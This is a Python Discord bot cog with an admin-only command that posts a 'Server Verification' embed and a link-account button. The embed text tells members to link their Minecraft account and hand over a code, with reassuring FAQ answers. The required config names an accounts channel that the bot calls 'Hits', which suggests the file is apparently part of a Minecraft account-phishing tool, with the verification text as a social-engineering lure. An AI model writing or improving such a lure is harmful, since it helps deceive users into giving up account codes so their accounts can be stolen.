from ui.modals.verification_embed import CustomVerification
from ui.buttons.link_account import LinkAccountView

from discord.ext import commands
import discord
import json

VERIFY_TITLE = "Server Verification"
VERIFY_DESCRIPTION = """
    Before entering the server, please link your Minecraft account to confirm you're a real human and not a robot. Verification gives you full server access and unlocks all channels.

    **FAQ**

    Q: Why do I need to verify?
    A: Verification helps us assign you your role. It also protects the server from intruders and sabotage attempts (a.k.a. raids).

    Q: How long does it take to get verified?
    A: The verification process doesn't take too long! You'll usually get your roles within 30–50 seconds, depending on traffic.

    Q: Why do you need to collect a code?
    A: The code confirms with the Minecraft API that you truly own the account you're verifying, it is required to verify because we are dealing with bots daily.
    """

class sendEmbed(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    send = discord.SlashCommandGroup("send")
    @send.command(name="embed", description="Sends the verification embed")
    async def embed_command(
        self, 
        ctx: discord.ApplicationContext, 
        type: str = discord.Option(str, description="Choose embed type", choices=["Default", "Custom"])
    ):
        if ctx.author.id not in self.bot.admins:
            await ctx.respond(
                "You do not have permission to execute this command!", 
                ephemeral=True
            )
            return
        
        config = json.load(open("config/config.json", "r"))
        
        if not config["discord"]["logs_channel"] or not config["discord"]["accounts_channel"]:
            await ctx.respond(
                "You must set the logs and Hits channel first with /set_channel!",
                ephemeral=True
            )
            return
        
        match type.lower():
            case "default":
                await ctx.defer(ephemeral=True)
                await ctx.channel.send(
                    embed = discord.Embed(
                        title = VERIFY_TITLE,
                        description = VERIFY_DESCRIPTION,
                        color = 0x3B89FF
                    ),
                    view = LinkAccountView()
                )
                await ctx.followup.send("Sent!", ephemeral=True)
            case "custom":
                await ctx.send_modal(CustomVerification())

def setup(bot: commands.Bot) -> None:
    bot.add_cog(sendEmbed(bot))